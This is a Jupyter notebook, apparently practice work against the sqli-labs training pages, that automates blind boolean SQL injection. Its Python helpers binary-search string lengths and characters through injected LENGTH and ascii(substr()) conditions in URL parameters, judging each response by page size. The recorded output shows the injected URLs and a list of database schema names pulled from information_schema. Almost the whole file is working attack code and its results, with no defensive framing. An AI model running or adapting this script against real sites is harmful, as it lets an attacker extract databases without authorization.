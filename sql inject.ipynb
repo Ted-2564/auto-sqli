{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "schema_name = 'group_concat(schema_name) from information_schema.schemata'\n",
    "table_name = 'group_concat(table_name) from information_schema.tables where table_schema'\n",
    "column_name = 'group_concat(column_name) from information_schema.columns where table_name'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "def findx(z,x):\n",
    "    num=0\n",
    "    for i in range(7):\n",
    "        num += (1<<(6-int(i)))\n",
    "        url = z\n",
    "        url += f'{x+1},1))>={num}--+'\n",
    "        a = requests.get(url)\n",
    "        if len(a.text) == 704:\n",
    "            pass\n",
    "        else:\n",
    "            num -= (1<<(6-int(i)))\n",
    "    print(chr(num),end='')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [],
   "source": [
    "def Len(x):\n",
    "    Len = 0\n",
    "    for i in range(7):\n",
    "        url = x\n",
    "        Len += (1<<(6-int(i)))\n",
    "        url += \"%s--+\"%Len\n",
    "        print(url)\n",
    "        a = requests.get(url)\n",
    "        if len(a.text) == 704:\n",
    "            pass\n",
    "        else:\n",
    "            Len -= (1<<(6-int(i)))\n",
    "    print(f\"\\nlen = {Len}\")\n",
    "    return Len"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "http://sqli.com/Less-5/?id=1' and LENGTH((select group_concat(schema_name) from information_schema.schemata))>=64--+\n",
      "http://sqli.com/Less-5/?id=1' and LENGTH((select group_concat(schema_name) from information_schema.schemata))>=96--+\n",
      "http://sqli.com/Less-5/?id=1' and LENGTH((select group_concat(schema_name) from information_schema.schemata))>=80--+\n",
      "http://sqli.com/Less-5/?id=1' and LENGTH((select group_concat(schema_name) from information_schema.schemata))>=72--+\n",
      "http://sqli.com/Less-5/?id=1' and LENGTH((select group_concat(schema_name) from information_schema.schemata))>=68--+\n",
      "http://sqli.com/Less-5/?id=1' and LENGTH((select group_concat(schema_name) from information_schema.schemata))>=66--+\n",
      "http://sqli.com/Less-5/?id=1' and LENGTH((select group_concat(schema_name) from information_schema.schemata))>=67--+\n",
      "\n",
      "len = 67\n",
      "information_schema,challenges,mysql,performance_schema,security,sys"
     ]
    }
   ],
   "source": [
    "def schema():\n",
    "    x = '''http://sqli.com/Less-6/?id=1\" and LENGTH((select {}))>='''.format(schema_name)\n",
    "    z = '''http://sqli.com/Less-6/?id=1\" and ascii(substr((select {}),'''.format(schema_name)\n",
    "    len = Len(x)\n",
    "    for i in range(len):\n",
    "        findx(z,i)\n",
    "                    \n",
    "schema()\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "len = 0\n"
     ]
    }
   ],
   "source": [
    "def table(schema):\n",
    "    x = '''http://sqli.com/Less-6/?id=1\" and LENGTH((select {}='{}'))>='''.format(table_name,schema)\n",
    "    len = Len(x)\n",
    "    for i in range(len):\n",
    "        url = '''http://sqli.com/Less-6/?id=1\" and ascii(substr((select {}='{}'),'''.format(table_name,schema)\n",
    "        findx(url,i)\n",
    "\n",
    "table('security')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "len = 0\n"
     ]
    }
   ],
   "source": [
    "def column(table):\n",
    "    x = '''http://sqli.com/Less-6/?id=1\" and LENGTH((select {}='{}'))>='''.format(column_name,table)\n",
    "    len = Len(x)\n",
    "    for i in range(len):\n",
    "        url = '''http://sqli.com/Less-6/?id=1\" and ascii(substr((select {}='{}'),'''.format(column_name,table)\n",
    "        findx(url,i)\n",
    "\n",
    "column('emails')"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.11"
  },
  "orig_nbformat": 4
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
